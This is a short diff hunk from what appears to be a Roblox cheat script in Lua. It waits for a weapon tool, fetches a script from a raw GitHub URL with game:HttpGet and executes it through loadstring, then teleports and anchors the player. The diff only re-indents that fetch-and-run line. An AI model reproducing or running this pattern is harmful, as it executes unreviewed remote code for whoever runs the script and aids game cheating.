@@ -235,7 +235,7 @@ end
             tool = char:FindFirstChildOfClass("Tool")
             task.wait(0.2)
         until tool and tool:FindFirstChild("WeaponConfiguration")
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/wzaxk/check/refs/heads/main/s.txt", true))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/wzaxk/check/refs/heads/main/s.txt", true))()
 
         rootPart.CFrame = CFrame.new(-424, 28, -49041)
         rootPart.Anchored = true
